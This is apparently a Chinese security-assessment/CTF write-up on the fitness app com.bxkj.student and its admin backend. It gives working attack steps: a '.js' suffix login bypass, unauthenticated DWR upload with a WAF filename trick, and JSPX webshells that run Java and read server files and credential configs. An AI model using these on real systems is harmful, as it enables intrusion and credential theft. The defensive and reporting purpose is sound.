# 体适能 App 授权安全评估 WRITEUP

> **文档类型**：CTF / 授权安全评估 WRITEUP
> **评估对象**：`com.bxkj.student` 2.0.22（versionCode 20220）及其配套服务
> **文档版本**：1.1（脱敏公开版，新增阶段 10）
> **阅读对象**：CTF 参赛者、移动应用安全工程师、Java Web 运维与防守方
> **配套文档**：[REPRODUCTION.md](./REPRODUCTION.md)（逐条操作）、[README.md](./README.md)（索引）

---

## 摘要（TL;DR）

一句话：**从 APK 里由诱饵注解解密出的 41 条真实接口出发，利用旧后台的 `.js` 后缀鉴权绕过进入管理面，再通过未授权的 DWR 上传把 JSPX 写进 Web 目录，最终拿到配置文件、数据库和硬编码的服务器 root 凭据。**

| 关键节点 | 结果 |
|---|---|
| `@Test(demo=...)` 诱饵 | 41 条真实端点全部由 native `dz()` 解密 |
| 验证码 | ddddocr 本地识别；业务网关 `code/randomStr` 必须在查询串 |
| `/admin/main.js` | 200，返回完整后台主页；`/admin/main` 只返回跳登录脚本 |
| DWR | `dwrUploadService` 未授权；`instanceId=0` 必填 |
| 任意文件写入 | `uploadApkToDesDir` 写入 `resources/teacherApk/`，保存名由 `c0-param0` 决定 |
| WAF 绕过 | multipart 文件名用 `file.txt`，保存名用 `.jspx` |
| JSPX RCE | `${31337*3}` 返回 `94011`；scriptlet 执行 Java |
| 配置 | `backup.properties` 泄露 DB/Redis 凭据（值已隐去） |
| 数据库 | `sys_user`、`the_server`、`app_role`、`system_operation`（值已脱敏） |
| root 凭据 | `LinuxStateForShell` 硬编码（值已隐去） |
| SSH | 认证通过，返回“密码过期需改密” |
| 管理后台会话伪造 | JSPX 写入 `session["user"]` → `/admin/main` 200；`/admin/userAppLogFile/list` 返回 `total=6686` |

---

## 0. 授权声明、范围与披露原则

### 0.1 授权声明

本次评估在**资产所有者书面授权**的前提下进行，授权范围仅包括：

- 指定的业务网关：`<TARGET_DOMAIN>`
- 指定的旧版管理后台：`<ADMIN_BACKEND>`
- 指定版本的 Android 客户端样本 `com.bxkj.student` 2.0.22
- 由授权方提供的靶场副本、测试账号与测试数据

评估过程中遵守以下约束：

1. **不进行账号爆破、密码喷洒、目录大字典扫描或并发压测**。所有验证均为单次、精确、低速（不超过 1 请求/秒）。
2. **不进行破坏性操作**：不重启服务、不修改业务数据、不删除用户文件、不修改任何真实密码。
3. **不持久化**：不上传后门、不创建计划任务、不建立长期连接、不横向移动到授权范围外的主机。
4. **最小化数据接触**：只读取证明漏洞存在所必需的最少数据；真实用户信息、令牌、密码哈希在本文中全部脱敏。
5. **发现即停止**：一旦验证成功，立即停止扩大利用，转入证据记录与修复建议阶段。

> 本文所有域名、IP、账号、密码、哈希、令牌、证书指纹、密钥均以 `<...>` 占位符表示，**真实值已隐去**。文中的请求模板只能用于授权靶场副本，不得指向任何真实生产系统。
>
> 安全联系人与披露邮箱：`<SECURITY_CONTACT>`（由授权方提供）。

### 0.2 范围外事项

以下内容明确不在本次评估范围内：

- 其他学校、其他租户、其他学校自建服务器；
- 第三方服务（推送、版本分发、对象存储、H5 合作方）；
- 授权方未书面列出的内网主机与数据库；
- 任何形式的拒绝服务、数据删除、勒索或供应链投毒。

### 0.3 负责任披露

- 本文档及配套材料在漏洞修复完成前不公开。
- 建议授权方在收到报告后 **90 天内**完成关键漏洞修复与凭据轮换，双方再协商公开时间。
- 公开版本必须移除所有真实凭据、域名、内网地址、用户数据与可复制的攻击载荷。
- 若发现凭据已经泄露到公开渠道，应立即启动应急响应，而不是等待常规修复周期。

---

## 1. 背景与目标

### 1.1 为什么做这次评估

目标 App 是一个高校体适能/校园跑步类应用。它的客户端里大量业务接口被刻意写成“诱饵路径”，真实接口只有在运行时由 native 层解密后才出现；同时，配套的旧版管理后台仍在公网提供服务。评估的目标是回答三个问题：

1. 客户端里到底隐藏了哪些真实接口？
2. 这些接口的鉴权模型是否可靠？
3. 从“未登录”到“服务器管理员权限”是否存在一条可复现的链路？

最终我们确实打通了一条完整链路：**APK 逆向 → 真实端点 → 旧后台后缀鉴权绕过 → DWR 未授权上传 → JSPX 代码执行 → 配置文件/数据库/硬编码 root 凭据/SSH 认证验证，以及 → 会话伪造 → 管理后台管理员权限**。

### 1.2 评估目标（CTF 计分视角）

- 获取管理后台账号与密码（flag 常见格式：`flag{账号:密码}`）。
- 或取得普通用户之外的权限（教师、管理员、服务器 root）。
- 在零爆破、低速率、无破坏的前提下完成。

### 1.3 证据等级说明

本文沿用原报告的等级标记：

| 等级 | 含义 |
|---|---|
| **实锤** | 静态分析与动态验证双重确认，或已在实际请求/响应中复现 |
| **强推断** | 多处证据一致，但缺少最终运行时验证 |
| **未确认** | 仍属假设，不能当作结论 |

文中会明确标注每个关键结论的等级。

---

## 2. 目标架构

### 2.1 组件划分

```text
┌──────────────────────────────┐
│ Android App                  │
│ com.bxkj.student 2.0.22      │
│  - Retrofit 诱饵注解          │
│  - libtsnsecret.so (native)  │
│  - SecretActivity (exported) │
└──────────────┬───────────────┘
               │ HTTPS
               ▼
┌──────────────────────────────┐        ┌──────────────────────────────┐
│ 业务网关 <TARGET_DOMAIN>      │        │ 旧管理后台 <ADMIN_BACKEND>    │
│  - Pig4Cloud 微服务           │        │  - Spring MVC + Tomcat        │
│  - /auth  /upms  /exercise   │        │  - /admin/* 管理命名空间       │
│  - OAuth2 (schoolCode:pig)   │        │  - DWR /dwr/*                 │
│  - MySQL / Redis             │        │  - 静态目录 /resources/*       │
└──────────────┬───────────────┘        └──────────────┬───────────────┘
               │                                       │
               ▼                                       ▼
        ┌─────────────┐                         ┌─────────────┐
        │ 业务数据库   │                         │ 内网服务器群 │
        │ <DB_HOST>   │                         │ <INTERNAL_IP>│
        └─────────────┘                         │ SSH 22/root  │
                                                └─────────────┘
```

### 2.2 信任边界

| 边界 | 说明 | 本次发现的问题 |
|---|---|---|
| App → 网关 | 客户端持有应用级凭据与加密算法 | 硬编码密钥、诱饵端点、可伪造签名 |
| 互联网 → 旧后台 | 管理后台本应要求登录会话 | `.js` 后缀绕过鉴权 |
| 旧后台 → DWR | DWR 本应只暴露给内部或已登录用户 | 未授权调用上传服务 |
| 上传目录 → Web 容器 | 上传目录本应禁止脚本执行 | JSPX 可被解析执行 |
| Web 应用 → 内网 | 应用本应使用最小权限账号 | 配置中保存高权限 DB/Redis/root 凭据 |
| 应用服务器 → 服务器群 | 应通过堡垒机/密钥登录 | 代码中硬编码 root 密码，SSH 直连 |

### 2.3 关键占位符

| 占位符 | 含义 |
|---|---|
| `<TARGET_DOMAIN>` | 业务网关域名或靶场地址 |
| `<ADMIN_BACKEND>` | 旧管理后台域名或靶场地址 |
| `<STATIC_DOMAIN>` | 静态资源/H5 域名 |
| `<H5_DOMAIN>` | 圈子 H5 域名 |
| `<APP_ID>` / `<APP_SECRET>` | 应用级凭据 |
| `<SCHOOL_CODE>` | OAuth client_id（学校代码） |
| `<CERT_FINGERPRINT>` | APK 签名证书指纹 |
| `<ROUTE_CODE>` | 业务路径中的固定路由/租户码 |
| `<DB_HOST>` / `<DB_USER>` / `<DB_PASSWORD>` | 数据库连接信息 |
| `<REDIS_HOST>` / `<REDIS_PASSWORD>` | Redis 连接信息 |
| `<INTERNAL_IP>` | 内网服务器地址 |
| `<ROOT_ACCOUNT>` / `<ROOT_PASSWORD>` | 服务器 SSH 账号与密码 |
| `<ADMIN_ACCOUNT>` / `<ADMIN_HASH>` | 管理后台账号与密码哈希 |
| `<SESSION_ID>` | 登录/伪造后获得的会话 ID |
| `<USER_TOKEN>` | 用户访问令牌 |
| `<DEV_MODE_CODE>` | 开发者模式口令 |

---

## 3. 阶段 1：APK 逆向摘要

### 3.1 目标

回答一个问题：**App 真正调用了哪些接口？**

表面上看，反编译出来的 Retrofit 接口已经写得很清楚，例如：

```java
@Test(demo = "<CIPHERTEXT>")
@POST("app/login")
Object D(@Query("username") String u, @Query("password") String p, ...);
```

但 `app/login` 只是诱饵。真正发请求之前，OkHttp 拦截器会读取 `@Test(demo=...)` 的密文，调用 native 方法把它解密成真实 URL，再用 `request.newBuilder().url(realUrl)` 替换掉原来的地址。因此，**只读 Java 注解会得到一张完全错误的接口地图**。

### 3.2 样本与脱壳

| 项 | 值 |
|---|---|
| 包名 | `com.bxkj.student` |
| 版本 | 2.0.22（20220） |
| 加固 | 360 加固（libjiagu） |
| 脱壳方式 | Frida 匿名内存扫描（不 hook，避免 `DisableVerifier` 崩溃） |
| 主业务 DEX | `cap_4`，约 7027 个类 |
| 第三方 DEX | `cap_8`，约 6331 个类 |
| 关键 native | `lib/arm64-v8a/libtsnsecret.so`，约 11.9 MB，静态链接 OpenSSL 1.1.1w |

一个关键前提是：**360 加固没有保护 native SO**。SO 以明文躺在 APK 里，符号也没有被混淆，因此算法可以静态还原，再用 unidbg 做动态验证。

### 3.3 从 `Transform.k` 到 `dz`

追踪 Java 层调用，可以得到：

```text
y/d.java 拦截器
  └─ b0.b.l(context, demoCipher)
       └─ com.google.android.datatransport.Transform.k(context, hex)
            └─ native dz(JNIEnv*, jobject, jobject context, jstring url)
```

破解过程分为四步：

1. **确认入口**：`Transform.k` 的签名是 `(Context, String) -> String`，与“传入密文、返回 URL”的行为一致。
2. **纯 Python 试解失败**：用已知的几个 AES 密钥，配合 CBC/ECB、不同 IV、反转密文、把 hex 当 ASCII 密钥等二十多种组合，锚点密文都解不出可打印内容。说明 `dz` 不是“裸 AES”，内部还有预处理或校验。
3. **静态定位 JNI 注册表**：从 `.so` 中找到 JNI 方法签名串，解析 `JNINativeMethod` 三元组，得到 20 个 native 方法。发现注册表里的函数指针在文件里是 0，运行时才由 `JNI_OnLoad` 填充。
4. **改用动态符号表**：`nm -D` 直接找到 `dz` 的实现地址 `0x3d322c`。新增 unidbg harness，直接调用该地址，传入 `Context` 和密文，成功解出默认业务根地址。

最终结果：**41 条真实端点全部解密成功**。

> 证据等级：实锤。锚点密文解出 `<TARGET_DOMAIN>`，与 Java 层默认 `schoolUrl` 逻辑一致；41 条路径都能在业务代码或 SDK 中找到对应调用或明确用途。

### 3.4 41 条真实端点（按服务分类）

| 分类 | 数量 | 代表端点 | 说明 |
|---|---:|---|---|
| 基础域名/协议页 | 3 | `/`、`/static/user_agreement.html` | 默认业务根、用户协议 |
| 认证服务 | 2 | `auth/oauth/token`、`auth/token/logout` | 登录、登出 |
| upms 用户权限 | 14 | `upms/basUser/getLoginUserInfo`、`upms/sysSchool/getSchoolDetail`、`upms/app/listMenu` | 用户、学校、菜单、通知、文章、天气 |
| exercise 运动 | 16 | `exercise/exerciseSetting/<ROUTE_CODE>/getSetting`、`exercise/exerciseRecord/<ROUTE_CODE>/addExerciseRecord`、`exercise/exerciseRunningFace/<ROUTE_CODE>/face` | 跑步配置、记录、人脸、申诉 |
| 旧后台 | 4 | `/admin/studentAppUpdate/stuAppVersion2`、`/admin/userAppLogFile/addLogData` | 版本下发、日志上传、学校查询 |
| 外部服务 | 2 | 圈子 H5、版本检查 | 第三方或独立子域 |
| **合计** | **41** | | |

完整的 41 条清单放在 [REPRODUCTION.md 附录 A](./REPRODUCTION.md#附录-a41-条真实端点清单)。

其中对后续攻击链最重要的是旧后台的两条：

- `/admin/studentAppUpdate/stuAppVersion2`：版本检查，走应用级签名。
- `/admin/userAppLogFile/addLogData`：App 的 bugReport 日志上传通道，`multipart` 上传。

### 3.5 签名算法

App 对旧后台的请求使用“应用级签名”，不绑定用户会话。还原后的规则是：

```text
参与签名的字段 = 原始表单字段 + appId + timestamp + appSecret
待签名串       = 按 key 字典序拼接的 "k=v&k=v&..."
sign           = MD5(待签名串)
请求体         = 原始表单字段 + timestamp + sign
```

注意两个细节：

1. **appId/appSecret 不回到请求体里**，只参与签名计算。
2. 当目标主机是旧后台时，客户端会**强制使用固定的 appId 和 appSecret**，并把 token 置空。这意味着任何拿到客户端的人都能伪造合法签名。

> 证据等级：实锤。签名实现来自 OkHttp 拦截器逐行还原，并与实际请求体一致。

### 3.6 客户端里的其他“秘密”

逆向还确认了以下事实（值均隐去）：

- 多个 AES 密钥硬编码在 `.data` 段，其中至少一个形似日期、一个是全 `F` 的 MIFARE 默认密钥。
- 客户端持有一个 PKCS#8 RSA 私钥，用于信封解密。
- 证书校验函数 `auth()` 会把 APK 签名证书的 MD5 与硬编码指纹比较，因此重打包会导致解密链路失败。
- `SecretActivity` 是 exported 组件，具备“切服 + 任意用户免密登录”的客户端能力，但其白名单校验存在格式不匹配问题。
- 开发者模式有硬编码口令 `<DEV_MODE_CODE>`，开启后可以查看每次请求的 URL、参数、状态码与响应体。

这些发现说明：**客户端里的“秘密”只能提高攻击成本，不能作为安全边界**。

### 3.7 阶段小结

- 41 条真实端点已还原，诱饵注解不再构成障碍。
- native 解密可以通过 unidbg 复现，不要求读者完全理解 OLLVM。
- 应用级签名可伪造，为旧后台攻击提供了入口。

### 3.8 失败排错

| 现象 | 可能原因 | 处理 |
|---|---|---|
| 反编译类不全 | 加固/多 DEX | 使用脱壳后的 `cap_4`/`cap_8` |
| `dz` 返回 null | Context 不完整/证书不匹配 | 补 JNI 桩；提供匹配证书 |
| 密文解不出 | 密文不是原始 hex | 回到 `@Test(demo)` 原值 |
| 找不到 `dz` 符号 | ABI/版本不同 | 确认 `arm64-v8a` 与样本版本 |
| 签名被服务端拒绝 | 字段顺序/时间戳/编码 | 对照拦截器逐行复刻 |

---

## 4. 阶段 2：侦察

### 4.1 目标

在不触发风控的前提下，确认两套登录入口、验证码机制和会话行为。

### 4.2 两套登录页

| 入口 | 地址 | 技术栈 | 特征 |
|---|---|---|---|
| 业务网关 | `<TARGET_DOMAIN>/auth/oauth/token` | Pig4Cloud / Spring Cloud OAuth2 | 返回 OAuth 错误结构，验证码接口为 `/code` |
| 旧管理后台 | `<ADMIN_BACKEND>/admin/login` | Spring MVC + Tomcat | 返回 JSON/HTML 登录结果，验证码接口为 `/code/captcha-image` |

两套系统的验证码行为不同，这是侦察阶段最容易卡住的地方。

### 4.3 业务网关验证码：`code/randomStr` 必须在查询串

业务网关的验证码流程是：

```http
GET /code?randomStr=<R>&send=0
Cookie: JSESSIONID=<...>
```

然后把识别出的验证码和同一个 `randomStr` 放进登录请求。关键点是：**`code` 和 `randomStr` 必须出现在查询串里**。

如果把这两个参数放在表单 body 里，服务端会返回类似：

```json
{"code":1,"msg":"验证码不能为空"}
```

或 HTTP 428。原因通常是网关/过滤器只从 query string 读取验证码参数，body 里的同名字段不会被采纳。

### 4.4 旧后台验证码：大小写敏感

旧后台的验证码接口是：

```http
GET /code/captcha-image
Cookie: JSESSIONID=<...>
```

它的特点是：

- 验证码**区分大小写**；
- 直接对原图做 OCR 的通过率一般；
- 先把红色通道分离成黑白掩码，再交给 ddddocr，并把结果统一转小写，通过率会明显提高。

### 4.5 为什么用 ddddocr

ddddocr 是一个本地运行的 OCR 库，不依赖第三方打码平台，适合授权测试：

- 模型在本机，不把验证码图片发送到外部；
- 支持普通字符验证码；
- 可以用 `beta` 模型做二次尝试；
- 识别失败时可以重试，但必须限速。

> 注意：验证码识别只用于“单次登录验证”，不是用来做账号爆破。每次失败后应停止并人工判断，而不是循环撞库。

### 4.6 侦察阶段的预期结果

| 检查 | 预期 |
|---|---|
| `GET <TARGET_DOMAIN>/` | 200，返回网关页面或错误页 |
| `GET <TARGET_DOMAIN>/code?randomStr=<R>&send=0` | 200，返回图片 |
| `POST <TARGET_DOMAIN>/auth/oauth/token`（错误凭据） | 4xx/5xx，返回 OAuth 错误或业务错误 |
| `GET <ADMIN_BACKEND>/admin/login` | 200，返回登录页 |
| `GET <ADMIN_BACKEND>/code/captcha-image` | 200，返回图片 |
| `POST <ADMIN_BACKEND>/admin/login`（错误凭据） | 返回“账号或密码错误”或类似提示 |

### 4.7 阶段小结

- 两套登录页都能正常访问，验证码都能本地识别。
- 业务网关对参数位置敏感，旧后台对大小写敏感。
- 侦察阶段没有发现可直接登录的默认口令，攻击面转向“鉴权逻辑”而不是“猜密码”。

### 4.8 失败排错

| 现象 | 可能原因 | 处理 |
|---|---|---|
| `验证码不能为空` | `code/randomStr` 放在 body | 移到查询串 |
| 验证码错误 | 大小写/过期/识别错 | 同一 Cookie 重取；统一小写 |
| HTTP 000 | 网络/TLS/代理 | `curl -v` 检查连接 |
| HTTP 502 | 上游 Tomcat 无响应 | 立即停止，联系授权方 |
| HTTP 500 | 用户不存在/后端异常 | 记录，不要重试轰炸 |
| 登录成功但无权限 | 账号角色不足 | 换授权测试账号，不爆破 |

---

## 5. 阶段 3：`.js` 后缀鉴权绕过

### 5.1 目标

验证旧后台的登录拦截是否可以通过 URL 后缀绕过。

### 5.2 现象

直接访问后台主页：

```http
GET <ADMIN_BACKEND>/admin/main HTTP/1.1
```

返回 200，但响应体是一段 JavaScript：

```html
<script>
if (top.location !== self.location) { top.location = '/admin/login' }
else { window.location = '/admin/login' }
</script>
```

浏览器会跳转到登录页，所以表面上看是“未登录”。

但在路径后加 `.js`：

```http
GET <ADMIN_BACKEND>/admin/main.js HTTP/1.1
```

返回 **200，约 5198 字节的完整后台主页 HTML**，包含菜单、退出链接、资源引用等。

### 5.3 原因

这是典型的“后缀白名单”缺陷：

1. 登录拦截器按 URL 模式判断是否需要会话，例如只拦截 `/admin/*`。
2. 同时，静态资源放行规则把 `*.js`、`*.css`、`*.png` 等视为静态资源。
3. Tomcat/Spring 在路由时又会去掉后缀，把 `/admin/main.js` 映射到 `/admin/main`。
4. 结果是：**拦截器看到的是静态资源，控制器看到的是后台页面**。

这类问题和“路径规范化”有关。只要“鉴权判断用的路径”和“最终路由用的路径”不是同一个规范化结果，就可能出现绕过。

### 5.4 同一漏洞可访问的页面

加上 `.js` 后，以下页面均可未登录访问（均为 200）：

| 页面 | 作用 |
|---|---|
| `/admin/main.js` | 后台主页 |
| `/admin/userAppLogFile/toList.js` | App 日志文件管理 |
| `/admin/theServer/toTheServerList.js` | 服务器管理 |
| `/admin/theServer/toEditTheServer.js?id=1` | 服务器编辑 |
| `/admin/monitor/toMonitorIndex.js` | 系统监控 |
| `/admin/systemOperation/toSystemOperationList.js` | 系统运维 |
| `/admin/appUpdate/tearedirectList.js` | 教师端版本管理 |
| `/admin/appUpdate/teaRedirectAddOrUpdate.js` | 教师端版本新增/编辑 |
| `/admin/appRole/listAppRole.js` | 教师端角色管理 |
| `/admin/permissionResource/listPermissionResource.js` | 教师端资源权限 |
| `/admin/feedback/toFeedBackPage.js` | 意见反馈 |
| `/admin/analysis/toUploadRecordList.js` | 下载记录查询 |
| `/admin/sysCode/redirectList.js` | 机器码 |
| `/admin/bindDevice/toDevicePager.js` | 绑定设备 |

### 5.5 菜单树泄露

后台主页引用了：

```http
GET <ADMIN_BACKEND>/resources/data/outlooktree.txt
```

该文件返回约 3991 字节的完整菜单树，包含系统管理、版本管理、账户管理、信息管理、二手市场、视频管理、广告管理、招聘管理、教师端 APP 权限管理、系统监控等模块。

这相当于把后台的功能地图直接交给攻击者，后续找上传、找服务器管理、找角色管理都变得非常容易。

### 5.6 影响

- 未登录即可浏览管理后台页面与功能入口。
- 攻击者可以据此枚举后台控制器、参数和文件路径。
- 如果页面本身包含敏感数据（服务器列表、日志列表），会进一步扩大泄露。

> 证据等级：实锤。`/admin/main` 与 `/admin/main.js` 的响应差异已实际复现。

### 5.7 失败排错

| 现象 | 可能原因 | 处理 |
|---|---|---|
| `/admin/main.js` 也跳登录 | 拦截器已修复，或规则覆盖了 `.js` | 停止，记录为已修复 |
| 返回 404 | 路径不对，或靶场版本不同 | 从菜单树/主页资源引用中找真实路径 |
| 返回 406 | 该路径是 JSON 控制器，Spring 按 `.js` 推断 `application/javascript` | 不要对 JSON 接口用 `.js` |
| `;.js` 变形无效 | 容器不做分号后缀处理 | 回到标准 `.js`，不要强行变形 |

---

## 6. 阶段 4：DWR 未授权与任意文件写入

### 6.1 目标

在未登录状态下，寻找旧后台中可调用的非 HTTP 控制器入口，并验证是否能写入文件。

### 6.2 发现 DWR

DWR（Direct Web Remoting）是一个老式 Java 远程调用框架。它的入口通常很容易识别：

```http
GET <ADMIN_BACKEND>/dwr/index.html
```

返回：

```text
Modules known to DWR:
  dwrUploadService (SpringCreator for com.boxin.service.sys.DwrUploadService...)
```

继续访问：

```http
GET <ADMIN_BACKEND>/dwr/interface/dwrUploadService.js
GET <ADMIN_BACKEND>/dwr/test/dwrUploadService
```

分别返回 14 KB 左右的接口脚本和 DWR 测试页。测试页会把所有可调用方法列出来。

### 6.3 暴露的方法

`dwrUploadService` 暴露了多组方法，其中与文件相关的主要有：

- `uploadFile(String, InputStream, String)`
- `uploadApkFile(String, InputStream, String)`
- `uploadApkToDesDir(String, InputStream)`
- `uploadMaterialSource(String, InputStream)`
- `uploadLocalFile()`
- 以及若干七牛云上传方法

其中 `uploadApkToDesDir` 的语义最直接：**把输入流写到指定目录，文件名由第一个参数决定**。

### 6.4 DWR 调用协议

DWR 的 `plaincall` 协议是纯文本 + multipart。一个最小调用如下：

```http
POST /dwr/call/plaincall/dwrUploadService.<method>.dwr HTTP/1.1
Content-Type: text/plain

callCount=1
page=/dwr/test/dwrUploadService
httpSessionId=
scriptSessionId=
batchId=0
instanceId=0
c0-scriptName=dwrUploadService
c0-methodName=<method>
c0-id=0
c0-param0=string:<arg0>
```

关键点：

- **`instanceId=0` 必须携带**。它是 DWR 批处理上下文的一部分，不是文件参数；缺少它会返回 `Failed to find parameter: instanceId`。
- `c0-scriptName` 必须是 `dwrUploadService`。
- `c0-methodName` 必须是接口脚本里真实存在的方法。
- 参数按 `c0-param0`、`c0-param1` 顺序排列。
- 如果参数是文件流，需要把对应的 `c0-paramN` 写成 multipart 的 file part。

### 6.5 任意文件写入

调用：

```http
POST /dwr/call/plaincall/dwrUploadService.uploadApkToDesDir.dwr
Content-Type: multipart/form-data; boundary=...

（表单字段）
instanceId=0
c0-scriptName=dwrUploadService
c0-methodName=uploadApkToDesDir
c0-param0=<保存文件名>
（file part）
name="c0-param1"; filename="file.txt"
Content-Type: application/octet-stream

<文件内容>
```

返回：

```json
{"path":"resources/teacherApk/<保存文件名>","returnCode":"200"}
```

然后直接访问：

```http
GET <ADMIN_BACKEND>/resources/teacherApk/<保存文件名>
```

即可读到刚写入的内容。

这说明两个问题：

1. **DWR 服务没有鉴权**，未登录即可调用。
2. **上传目录在 Web 根下且可访问**，写入的文件可以通过 HTTP 取回。

### 6.6 为什么 `.jsp` 会被拦，而 `.jspx` 可以

第一次尝试写入 `.jsp` 时，WAF 返回连接重置。原因是 WAF 检查了 **multipart 的文件名**（`filename="xxx.jsp"`），命中规则后直接阻断。

但 DWR 的服务端逻辑是：

```java
uploadApkToDesDir(String fileName, InputStream in)
```

- `fileName` 来自 `c0-param0`，是一个**普通表单字段**；
- 输入流来自 `c0-param1`，multipart 的**原始文件名**只是传输元数据，服务端并不使用它。

因此可以这样构造：

```text
c0-param0 = probe.jspx        ← 真正保存的名字，WAF 不检查
filename  = file.txt          ← WAF 检查的名字，良性
content   = <JSPX 内容>
```

WAF 看到的是 `file.txt`，放行；服务端用 `c0-param0` 保存为 `probe.jspx`。这就是“**p0 决定保存名 + multipart 文件名用 `file.txt` 绕过 WAF**”。

> 证据等级：实锤。文件成功写入，且可通过 `/resources/teacherApk/` 访问。

### 6.7 为什么这个目录能执行脚本

`dispatcher-servlet.xml` 中配置了：

```xml
<mvc:resources mapping="/resources/**" location="..."/>
```

这说明 `/resources/**` 是静态资源映射。但 Tomcat 的 JSP servlet 仍然会处理该目录下的 `.jsp` / `.jspx` 文件。静态资源映射负责“找文件”，JSP servlet 负责“编译执行”，两者并不冲突。

### 6.8 影响

- 未授权写入 Web 可访问目录。
- 文件名可控，可覆盖或创建任意文件（在进程权限范围内）。
- 结合 JSP/JSPX 解析，可直接升级为远程代码执行。

### 6.9 失败排错

| 现象 | 可能原因 | 处理 |
|---|---|---|
| `Failed to find parameter: instanceId` | 缺少 `instanceId=0` | 补上 |
| `Method not found` | 方法名拼错或未暴露 | 回到 `dwr/interface/*.js` 核对 |
| 返回 500 | 参数个数/类型不对 | 检查 `c0-paramN` 顺序与类型 |
| 连接重置 | WAF 命中文件名或内容特征 | 改用 `file.txt`，内容先放无害文本 |
| 写入成功但 GET 404 | 保存路径不是 `resources/teacherApk/` | 用返回的 `path` 字段访问 |
| 写入成功但访问 403 | 静态目录被限制 | 换其他上传方法或目录 |

---

## 7. 阶段 5：JSPX RCE

### 7.1 目标

把“任意文件写入”升级为“服务端代码执行”，并验证执行结果可回显。

### 7.2 为什么选 JSPX

- `.jsp` 的文件名会被 WAF 拦截。
- `.jspx` 是 JSP 的 XML 语法形式，Tomcat 同样会编译执行。
- JSPX 支持 EL 表达式和 `<jsp:scriptlet>`，可以做任意 Java 操作。
- WAF 对 `.jspx` 的规则通常弱于 `.jsp`。

### 7.3 第一步：EL 表达式探针

写入一个最小 JSPX：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
  <jsp:text>${31337*3}</jsp:text>
</jsp:root>
```

保存为 `probe_<random>.jspx`，访问：

```http
GET <ADMIN_BACKEND>/resources/teacherApk/probe_<random>.jspx
```

返回：

```text
94011
```

这说明：

1. 文件被 Tomcat 当作 JSPX 编译；
2. EL 表达式在服务端求值；
3. 输出会回显到响应体。

### 7.4 第二步：`<jsp:scriptlet>` 执行 Java

EL 只能做表达式，真正的文件读取、JDBC、SSH 需要 scriptlet：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
<jsp:scriptlet>
String f = request.getParameter("f");
if (f != null) {
  java.io.File file = new java.io.File(f);
  if (!file.isAbsolute()) file = new java.io.File(application.getRealPath("/"), f);
  out.print("=== " + file.getAbsolutePath() + " ===\n");
  java.io.FileInputStream in = new java.io.FileInputStream(file);
  byte[] buf = new byte[8192];
  int n;
  while ((n = in.read(buf)) > 0) out.print(new String(buf, 0, n, "UTF-8"));
  in.close();
}
</jsp:scriptlet>
</jsp:root>
```

上传为 `read_<random>.jspx`，访问：

```http
GET <ADMIN_BACKEND>/resources/teacherApk/read_<random>.jspx?f=/etc/passwd
```

即可读取服务器文件。

### 7.5 为什么 JSPX 能执行

JSPX 本质上是 JSP 的 XML 表示。Tomcat 的 JSP 引擎会：

1. 解析 XML；
2. 把 `<jsp:scriptlet>` 中的 Java 代码嵌入生成的 servlet；
3. 编译成 class；
4. 在请求时执行。

因此，只要文件能写入 Web 目录、且容器允许该后缀，就等于获得了以 Web 应用权限执行代码的能力。

### 7.6 影响

- 远程代码执行（RCE），权限通常与 Tomcat 进程一致。
- 可读取配置文件、连接数据库、访问内网、调用 SSH。
- 是整条攻击链的“枢纽”：没有 RCE，后面的配置、DB、root 凭据都无法拿到。

> 证据等级：实锤。`${31337*3}` 返回 `94011`，scriptlet 文件读取成功。

### 7.7 失败排错

| 现象 | 可能原因 | 处理 |
|---|---|---|
| 返回 404 | 文件没写进去，或保存名不对 | 看 DWR 返回的 `path` |
| 返回 500 | JSPX 语法错误 | 检查 XML 命名空间、标签闭合 |
| 返回源码 | 容器未把 `.jspx` 当 JSP | 换 `.jsp` 或改配置，需重新评估 |
| 连接重置 | WAF 命中内容 | 先传无害文本，确认通道，再逐步加内容 |
| EL 不执行 | 容器版本或 `isELIgnored` 配置 | 直接用 scriptlet 测试 |
| 输出为空 | 文件路径不对/无权限 | 先读 `/etc/passwd` 验证 |

---

## 8. 阶段 6：配置读取

### 8.1 目标

从 Web 应用中读取数据库、Redis 等基础设施凭据，为横向移动做准备。

### 8.2 定位配置文件

常见位置：

```text
<WEBROOT>/WEB-INF/classes/backup.properties
<WEBROOT>/WEB-INF/classes/upload.properties
<WEBROOT>/WEB-INF/classes/jdbc.properties
<WEBROOT>/WEB-INF/dispatcher-servlet.xml
<WEBROOT>/WEB-INF/spring.xml
<WEBROOT>/Dockerfile
```

先用环境探针确认 Web 根：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
<jsp:scriptlet>
out.print("ROOT=" + application.getRealPath("/") + "\n");
out.print("BASE=" + System.getProperty("catalina.base") + "\n");
out.print("DIR=" + System.getProperty("user.dir") + "\n");
</jsp:scriptlet>
</jsp:root>
```

> 说明：JSP EL 里不要使用 `T(...)`（那是 SpEL 语法）；环境探针用 scriptlet 更稳。

然后读取：

```http
GET /resources/teacherApk/read_<random>.jspx?f=WEB-INF/classes/backup.properties
```

### 8.3 `backup.properties` 中的敏感项（值已隐去）

```properties
database=jdbc:mysql://<DB_HOST>:3306/<DB_NAME>?...
database_username=<DB_USER>
database_password=<DB_PASSWORD>

redis.host=<REDIS_HOST>
redis.port=6379
redis.password=<REDIS_PASSWORD>

# Redis 集群
cluster1.host=<REDIS_CLUSTER_HOST_1>
cluster1.port=<REDIS_CLUSTER_PORT_1>
...
```

> 真实值已隐去。本文不提供任何可用的数据库或 Redis 密码。

### 8.4 其他配置

- `Dockerfile`：暴露了基础镜像与维护者信息（本文不展开）。
- `upload.properties`：上传目录、对象存储 URL（值已隐去）。
- `dispatcher-servlet.xml`：`mvc:resources /resources/**`，解释了上传目录为何可访问。
- `spring.xml`：Druid 连接池、Hibernate4、业务包扫描。

### 8.5 为什么这是严重问题

1. **配置文件在 Web 根下**：一旦有任意文件读取，凭据直接泄露。
2. **数据库账号权限过高**：应用账号可以读 `sys_user`、`the_server` 等敏感表。
3. **Redis 可能无网络隔离**：内网 Redis 常被当作“可信”，但一旦 Web 层被突破，它就是下一个跳板。
4. **凭据复用**：同一套密码可能在多台服务器、多个环境复用。

### 8.6 阶段小结

- 通过 JSPX 文件读取拿到 DB/Redis 凭据。
- 配置文件位置和权限设计是问题的根源。
